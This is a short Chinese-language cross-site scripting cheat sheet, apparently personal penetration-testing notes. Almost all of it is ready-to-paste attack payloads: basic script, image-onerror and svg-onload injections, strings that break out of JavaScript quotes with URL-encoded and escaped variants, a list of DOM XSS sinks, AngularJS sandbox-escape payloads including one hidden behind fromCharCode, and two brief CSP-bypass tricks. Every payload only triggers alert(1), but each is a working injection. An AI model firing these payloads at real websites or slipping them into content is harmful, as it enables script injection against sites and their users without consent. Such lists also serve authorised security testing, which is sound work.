## 基本POC:
- "><script>alert(1)</script>
- <img src=1 onerror=alert(1)>
- " autofocus onfocus=alert(1) x="
- <a href="javascript:alert(1)">
- "><svg onload=alert(1)>
- <span title="" onmouseover="alert(/XSS/)">" onmouseover="alert(/XSS/)</span>
## js方法POC：
&apos;	单引号	作用：跳出前一个js
- &apos;-alert(1)-&apos;  
原型
- %27%2dalert(1)%2d%27  
url编码
- ';alert(1)//
- \\';alert(1)//  
当单引号被转义时
- ${alert(1)}  
有引号处理文字时	如：var input='payload';
- https://url/?%27accesskey=%27x%27onclick=%27alert(1)  
设置快捷件触发,accesskey:指定快捷键属性 `<a href="url" accesskey="c">CSS</a>`
ctrl+shift+c触发
- document.forms[0].submit()  
提交当前页面的第一个表单
## DOM XSS出现位置函数
`document.write、location.search、eval（）、location、someDOMElement.innerHTML/uterHTML/insertAdjacentHTML/onevent`
## 沙箱逃逸
- toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
- <input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
- {{$on.constructor('alert(1)')()}}
## 绕过CSP
- 悬空标记注入，指定url地址后面用？跟参数
- 修改响应包中CSP指令，覆盖现有规则script-src等